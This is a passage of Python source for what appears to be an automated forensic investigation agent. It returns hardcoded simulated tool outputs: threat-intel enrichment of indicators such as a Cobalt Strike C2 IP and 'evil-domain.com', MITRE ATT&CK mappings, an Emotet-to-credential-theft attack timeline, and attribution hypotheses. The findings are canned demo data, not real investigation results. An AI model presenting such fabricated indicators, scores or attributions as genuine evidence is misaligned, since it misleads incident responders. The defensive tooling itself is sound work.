                    {"type": "attribution", "value": "C2 infrastructure geolocated to RU", "confidence": 0.85, "context": "OTX geolocation data", "mitre_techniques": [], "threat_score": 0.8},
                    {"type": "threat_intel", "value": "47 OTX pulses reference this infrastructure", "confidence": 0.95, "context": "High community reporting indicates active threat", "mitre_techniques": [], "threat_score": 0.95},
                ],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "OTX confirms APT-level threat. Need unified enrichment with threat scoring.",
            },
            "enrich_ioc": {
                "thought": "Unified IOC enrichment combines all sources and calculates a comprehensive threat score for prioritization.",
                "action": "Perform unified enrichment with threat scoring and MITRE technique mapping.",
                "input": {
                    "source": "previous_step",
                    "iocs": iocs,
                },
                "output": {
                    "raw": "Enrichment complete:\n185.220.101.45: Threat Score 0.95, CobaltStrike C2\nevil-domain.com: Threat Score 0.88, Malware Distribution\n192.168.1.100: Threat Score 0.70, Internal staging server",
                    "parsed": {
                        "enriched_iocs": [
                            {
                                "ioc": "185.220.101.45",
                                "type": "ip",
                                "threat_score": 0.95,
                                "classification": "C2 Server",
                                "malware_family": "CobaltStrike",
                                "mitre_techniques": ["T1071.001", "T1219"],
                            },
                            {
                                "ioc": "evil-domain.com",
                                "type": "domain",
                                "threat_score": 0.88,
                                "classification": "Malware Distribution",
                                "mitre_techniques": ["T1105"],
                            },
                            {
                                "ioc": "192.168.1.100",
                                "type": "ip",
                                "threat_score": 0.70,
                                "classification": "Internal Staging",
                                "context": "Internal IP used for lateral movement",
                                "mitre_techniques": ["T1570"],
                            },
                        ],
                    },
                },
                "evidence": [
                    {"type": "enrichment", "value": "All IOCs enriched with threat scores", "confidence": 0.95, "context": "Unified threat intelligence", "mitre_techniques": [], "threat_score": 0.9},
                ],
                "mitre_techniques": [
                    {"tactic": "Lateral Movement", "technique_id": "T1570", "technique_name": "Lateral Tool Transfer", "confidence": 0.7},
                ],
                "timeline_events": [],
                "next_step_reasoning": "IOC enrichment complete. MITRE mapping will provide tactical context for all findings.",
            },
        }
        return outputs.get(tool_id, self._generate_generic_output(tool_id, prev_evidence))

    def _generate_mitre_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate MITRE ATT&CK mapping output."""
        outputs = {
            "forensic_mapping": {
                "thought": "Mapping forensic artifacts to MITRE ATT&CK provides tactical context and helps understand attacker objectives and methodology.",
                "action": "Map all discovered forensic events and artifacts to MITRE ATT&CK techniques with confidence scoring.",
                "input": {
                    "source": "previous_steps",
                    "events": [
                        "PowerShell encoded execution",
                        "rundll32.exe execution",
                        "LSASS access",
                        "Registry Run key modification",
                        "Service creation",
                        "Network connection to external IP",
                    ],
                },
                "output": {
                    "raw": "Mapping complete:\nPowerShell -> T1059.001 (Execution)\nrundll32 -> T1218.011 (Defense Evasion)\nLSASS -> T1003.001 (Credential Access)\nRun Key -> T1547.001 (Persistence)\nService -> T1543.003 (Persistence)\nC2 Connection -> T1071.001 (Command and Control)",
                    "parsed": {
                        "technique_coverage": {
                            "Initial Access": ["T1566.001"],
                            "Execution": ["T1059.001", "T1059.005"],
                            "Persistence": ["T1547.001", "T1543.003"],
                            "Defense Evasion": ["T1218.011", "T1027", "T1055"],
                            "Credential Access": ["T1003.001"],
                            "Lateral Movement": ["T1570"],
                            "Command and Control": ["T1071.001", "T1571", "T1219"],
                        },
                        "total_techniques": 12,
                        "tactics_covered": 7,
                    },
                },
                "evidence": [
                    {"type": "mitre_coverage", "value": "12 techniques across 7 tactics identified", "confidence": 0.9, "context": "Comprehensive technique mapping", "mitre_techniques": [], "threat_score": 0.85},
                ],
                "mitre_techniques": [
                    {"tactic": "Defense Evasion", "technique_id": "T1055", "technique_name": "Process Injection", "confidence": 0.95},
                    {"tactic": "Execution", "technique_id": "T1059.005", "technique_name": "Visual Basic", "confidence": 0.7},
                ],
                "timeline_events": [],
                "next_step_reasoning": "MITRE mapping complete. Timeline correlation will organize findings chronologically.",
            },
            "technique_lookup": {
                "thought": "Looking up specific techniques provides detection guidance and helps understand adversary behavior patterns.",
                "action": "Query MITRE ATT&CK knowledge base for detailed technique information on identified TTPs.",
                "input": {
                    "source": "previous_step",
                    "technique_ids": ["T1059.001", "T1003.001", "T1219"],
                },
                "output": {
                    "raw": "T1059.001 - PowerShell:\nDescription: Adversaries may abuse PowerShell commands and scripts for execution.\nDetection: Monitor for loading of PowerShell module files, script block logging.\nData Sources: Command, Process, Module\n\nT1003.001 - LSASS Memory:\nDescription: Adversaries may access credential material stored in LSASS.\nDetection: Monitor for LSASS access from unusual processes.\nData Sources: Process Access",
                    "parsed": {
                        "techniques": [
                            {
                                "id": "T1059.001",
                                "name": "PowerShell",
                                "tactic": "Execution",
                                "detection": "Script block logging, module loads",
                                "data_sources": ["Command", "Process", "Module"],
                            },
                            {
                                "id": "T1003.001",
                                "name": "LSASS Memory",
                                "tactic": "Credential Access",
                                "detection": "LSASS access monitoring",
                                "data_sources": ["Process Access"],
                            },
                            {
                                "id": "T1219",
                                "name": "Remote Access Software",
                                "tactic": "Command and Control",
                                "detection": "Monitor for known RAT traffic patterns",
                                "data_sources": ["Network Traffic"],
                            },
                        ],
                    },
                },
                "evidence": [],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Technique details retrieved. Build final attack timeline.",
            },
        }
        return outputs.get(tool_id, self._generate_generic_output(tool_id, prev_evidence))

    def _generate_correlation_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate correlation and timeline output."""
        outputs = {
            "timeline_builder": {
                "thought": "Building a comprehensive attack timeline correlates all events and evidence into a coherent narrative of the intrusion.",
                "action": "Correlate all timestamped events across tools into unified attack timeline with confidence scoring.",
                "input": {
                    "source": "all_previous_steps",
                    "events": "All extracted timeline events",
                },
                "output": {
                    "raw": "Attack Timeline Constructed:\n14:30:00 - Initial Access (Emotet phishing)\n14:32:15 - Execution (PowerShell downloader)\n14:33:42 - Discovery (whoami, ipconfig)\n14:34:01 - Defense Evasion (rundll32 execution)\n14:35:00 - C2 (Cobalt Strike beacon)\n14:35:30 - Persistence (Run key, Service)\n14:40:00 - Credential Access (LSASS dump)",
                    "parsed": {
                        "timeline": [
                            {"timestamp": "2024-01-15T14:30:00Z", "phase": "Initial Access", "event": "Emotet phishing email opened", "technique": "T1566.001", "confidence": 0.85},
                            {"timestamp": "2024-01-15T14:32:15Z", "phase": "Execution", "event": "Encoded PowerShell downloader executed", "technique": "T1059.001", "confidence": 0.95},
                            {"timestamp": "2024-01-15T14:33:42Z", "phase": "Discovery", "event": "System reconnaissance (whoami, ipconfig)", "technique": "T1082", "confidence": 0.9},
                            {"timestamp": "2024-01-15T14:34:01Z", "phase": "Defense Evasion", "event": "Payload execution via rundll32", "technique": "T1218.011", "confidence": 0.95},
                            {"timestamp": "2024-01-15T14:35:00Z", "phase": "Command and Control", "event": "Cobalt Strike beacon established", "technique": "T1219", "confidence": 0.95},
                            {"timestamp": "2024-01-15T14:35:30Z", "phase": "Persistence", "event": "Registry Run key and Service installed", "technique": "T1547.001", "confidence": 0.9},
                            {"timestamp": "2024-01-15T14:40:00Z", "phase": "Credential Access", "event": "LSASS memory dump via Mimikatz", "technique": "T1003.001", "confidence": 0.95},
                        ],
                        "attack_duration": "10 minutes",
                        "phases_observed": ["Initial Access", "Execution", "Discovery", "Defense Evasion", "Command and Control", "Persistence", "Credential Access"],
                    },
                },
                "evidence": [
                    {"type": "timeline", "value": "Complete attack timeline: 14:30 - 14:40 (10 minutes)", "confidence": 0.95, "context": "Full attack reconstruction", "mitre_techniques": [], "threat_score": 0.95},
                ],
                "mitre_techniques": [
                    {"tactic": "Discovery", "technique_id": "T1082", "technique_name": "System Information Discovery", "confidence": 0.9},
                ],
                "timeline_events": [],
                "next_step_reasoning": "Timeline complete. Generate attack hypothesis with confidence assessment.",
            },
            "hypothesis_generator": {
                "thought": "Based on all evidence and the attack timeline, generate high-confidence hypotheses about the attack nature, attribution, and impact.",
                "action": "Analyze all findings to generate attack hypotheses with supporting evidence chain.",
                "input": {
                    "source": "all_evidence",
                    "timeline": "Complete attack timeline",
                    "mitre_mapping": "All technique mappings",
                },
                "output": {
                    "raw": "HYPOTHESIS 1 (High Confidence 0.92):\nAttack Type: Multi-stage intrusion with Emotet + Cobalt Strike\nObjective: Credential theft and persistent access\nThreat Actor: Financially motivated (TrickBot/Emotet ecosystem)\n\nHYPOTHESIS 2 (Medium Confidence 0.75):\nPotential ransomware precursor activity\nRecommend immediate containment",
                    "parsed": {
                        "hypotheses": [
                            {
                                "id": 1,
                                "confidence": 0.92,
                                "title": "Multi-stage Intrusion: Emotet + Cobalt Strike",
                                "attack_type": "Initial Access to Credential Theft",
                                "threat_actor": "TA551 / Shathak (Emotet distributor)",
                                "objective": "Credential harvesting and persistent backdoor access",
                                "supporting_evidence": [
                                    "Emotet YARA signature match",
                                    "Cobalt Strike beacon detected",
                                    "Mimikatz credential dumping",
                                    "Known Cobalt Strike C2 infrastructure (185.220.101.45)",
                                ],
                                "recommendations": [
                                    "Isolate affected systems immediately",
                                    "Reset all credentials for compromised accounts",
                                    "Block C2 IPs at perimeter firewall",
                                    "Hunt for lateral movement indicators",
                                ],
                            },
                            {
                                "id": 2,
                                "confidence": 0.75,
                                "title": "Potential Ransomware Precursor",
                                "attack_type": "Pre-ransomware reconnaissance",
                                "objective": "Prepare for ransomware deployment",
                                "supporting_evidence": [
                                    "Emotet-to-ransomware attack chain documented",
                                    "Credential harvesting typically precedes ransomware",
                                    "Persistence mechanisms established",
                                ],
                                "recommendations": [
                                    "Check for backup integrity",
                                    "Monitor for ransomware indicators",
                                    "Prepare incident response plan",
                                ],
                            },
                        ],
                    },
                },
                "evidence": [
                    {"type": "hypothesis", "value": "Emotet + Cobalt Strike multi-stage attack (92% confidence)", "confidence": 0.92, "context": "Primary attack hypothesis", "mitre_techniques": [], "threat_score": 0.95},
                    {"type": "attribution", "value": "TA551 / Shathak threat actor suspected", "confidence": 0.75, "context": "Based on TTPs and infrastructure", "mitre_techniques": [], "threat_score": 0.8},
                ],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Investigation complete. All findings ready for final report generation.",
            },
        }
        return outputs.get(tool_id, self._generate_generic_output(tool_id, prev_evidence))

    def _generate_disk_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate disk forensics output."""
        return {
            "thought": f"Executing disk forensics tool {tool_id} to analyze filesystem artifacts.",
            "action": f"Run {tool_id} for comprehensive disk analysis.",
            "input": {"source": "artifact", "tool": tool_id},
            "output": {
                "raw": "Disk analysis completed",
                "parsed": {"status": "completed"},
            },
            "evidence": [],
            "mitre_techniques": [],
            "timeline_events": [],
            "next_step_reasoning": "Proceed with additional analysis.",
        }

    def _generate_linux_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate Linux forensics output."""
        return {
            "thought": f"Analyzing Linux system artifacts using {tool_id}.",
            "action": f"Execute {tool_id} for Linux forensics analysis.",
            "input": {"source": "artifact", "tool": tool_id},
            "output": {
                "raw": "Linux forensics analysis completed",
                "parsed": {"status": "completed"},
            },
            "evidence": [],
            "mitre_techniques": [],
            "timeline_events": [],
            "next_step_reasoning": "Continue with threat intelligence enrichment.",
        }

    def _generate_binary_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate binary analysis output."""
        return {
            "thought": f"Performing deep binary analysis using {tool_id}.",
            "action": f"Run {tool_id} for binary reverse engineering.",
            "input": {"source": "artifact", "tool": tool_id},
            "output": {
                "raw": "Binary analysis completed",
                "parsed": {"status": "completed"},
            },
            "evidence": [],
            "mitre_techniques": [],
            "timeline_events": [],
            "next_step_reasoning": "Proceed with additional analysis.",
        }

    def _generate_document_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate document analysis output."""
        return {
            "thought": f"Analyzing potentially malicious document using {tool_id}.",
            "action": f"Execute {tool_id} for document forensics.",
            "input": {"source": "artifact", "tool": tool_id},
            "output": {
                "raw": "Document analysis completed",
                "parsed": {"status": "completed"},
            },
            "evidence": [],
            "mitre_techniques": [],
            "timeline_events": [],
            "next_step_reasoning": "Continue with malware analysis.",
        }

    def _generate_network_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate network forensics output."""
        return {
            "thought": f"Analyzing network traffic using {tool_id}.",
            "action": f"Execute {tool_id} for network forensics.",
            "input": {"source": "artifact", "tool": tool_id},
            "output": {
                "raw": "Network analysis completed",
                "parsed": {"status": "completed"},
            },
            "evidence": [],
            "mitre_techniques": [],
            "timeline_events": [],
            "next_step_reasoning": "Proceed with threat intelligence correlation.",
        }

    def _generate_generic_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate generic tool output."""
        return {
            "thought": f"Executing {tool_id} for forensic analysis.",
            "action": f"Run {tool_id} tool.",
            "input": {"source": "artifact", "tool": tool_id},
            "output": {
                "raw": f"{tool_id} execution completed",
                "parsed": {"status": "completed"},
            },
            "evidence": [],
            "mitre_techniques": [],
            "timeline_events": [],
            "next_step_reasoning": "Continue with next analysis phase.",
        }

    async def _complete_investigation(self) -> None:
        """Complete the investigation and generate summary."""
        session_obj = self.session_manager.get_session_object(self.session_id)
        if not session_obj:
            return

        summary, conclusion, hypotheses = await self._generate_final_summary(session_obj)

        self.session_manager.complete_session(
            self.session_id,
            summary=summary.strip(),
            conclusion=conclusion.strip(),
        )

        self.session_manager.set_progress(self.session_id, 100, "completed")
        await self.ws_manager.send_progress(self.session_id, 100, "completed")
        await self.ws_manager.send_complete(self.session_id, summary.strip(), conclusion.strip())

        for hyp in hypotheses:
            self.session_manager.add_hypothesis(self.session_id, hyp)
            await self.ws_manager.send_hypothesis(self.session_id, hyp)

    async def _generate_final_summary(self, session_obj: "Session") -> tuple[str, str, List[Dict[str, Any]]]:
        """Generate final summary, conclusion and hypotheses for the session."""
        try:
            evidence_summary = "\n".join(
                [f"- {ev.type}: {ev.value} ({ev.threat_score * 100:.0f}% confidence)" for ev in session_obj.evidence[-15:]]
            ) or "No evidence was collected during this investigation."
            step_summary = "\n".join(
                [f"- {step.tool} ({step.phase}): {step.thought[:120]}" for step in session_obj.steps[-10:]]
            ) or "No steps were executed during this investigation."
            prompt = (
                "You are a senior digital forensics investigator tasked with producing a concise incident summary. "
                "Based on the evidence and the sequence of tool steps, provide a JSON object with keys: summary, conclusion, hypotheses. "
                "Hypotheses should be a list of up to 2 objects with title, confidence, threat_actor, and objective. "
                f"Evidence:\n{evidence_summary}\n\n"
                f"Steps:\n{step_summary}\n\n"
                "Write clearly for security analysts and incident responders."
            )
            response = await self._call_openai(prompt)
            if response:
                text = response.strip()
                json_text = text[text.find("{"): text.rfind("}") + 1] if "{" in text and "}" in text else text
                data = json.loads(json_text)
                summary = data.get("summary", text)
                conclusion = data.get("conclusion", text)
                hypotheses = data.get("hypotheses", [])
                if isinstance(hypotheses, list):
                    return summary, conclusion, hypotheses
        except Exception:
            logger.exception("Final summary generation failed")

        fallback_summary = f"Investigation completed for {session_obj.artifact_name}. {len(session_obj.steps)} steps executed and {len(session_obj.evidence)} pieces of evidence collected."
        fallback_conclusion = "Autonomous forensic analysis completed. Review the collected evidence for final incident response actions."
        fallback_hypotheses = [
            {
                "confidence": 0.65,
                "title": "Suspicious multi-stage intrusion detected",
                "threat_actor": "Unknown",
                "objective": "Establish persistence and data exfiltration.",
            }
        ]
        return fallback_summary, fallback_conclusion, fallback_hypotheses
